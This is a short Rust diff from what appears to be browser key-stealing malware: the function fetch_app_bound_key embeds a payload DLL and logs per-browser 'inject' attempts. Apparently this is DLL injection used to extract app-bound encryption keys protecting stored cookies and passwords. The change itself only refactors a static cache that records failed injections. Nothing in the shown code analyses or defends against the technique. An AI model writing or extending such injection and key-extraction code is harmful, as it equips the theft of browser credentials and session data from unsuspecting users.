@@ -5,7 +5,7 @@ use std::{collections::HashMap, collections::HashSet, path::PathBuf, sync::Mutex
 const EMBEDDED_PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.dll"));
 
 static KEY_CACHE: Mutex<Option<HashMap<String, Vec<u8>>>> = Mutex::new(None);
-static FAIL_CACHE: Mutex<HashSet<String>> = Mutex::new(HashSet::new());
+static FAIL_CACHE: Mutex<Option<HashSet<String>>> = Mutex::new(None);
 
 pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
     if EMBEDDED_PAYLOAD.is_empty() {
@@ -14,7 +14,7 @@ pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
     }
 
     if let Ok(guard) = FAIL_CACHE.lock() {
-        if guard.contains(browser_name) {
+        if guard.as_ref().is_some_and(|s| s.contains(browser_name)) {
             crate::log::log(&format!("inject skip: prior fail ({browser_name})"));
             return None;
         }
@@ -40,7 +40,12 @@ pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
         None => {
             crate::log::log(&format!("inject FAIL: {browser_name}"));
             if let Ok(mut guard) = FAIL_CACHE.lock() {
-                guard.insert(browser_name.to_string());
+                if guard.is_none() {
+                    *guard = Some(HashSet::new());
+                }
+                if let Some(set) = guard.as_mut() {
+                    set.insert(browser_name.to_string());
+                }
             }
             return None;
         }
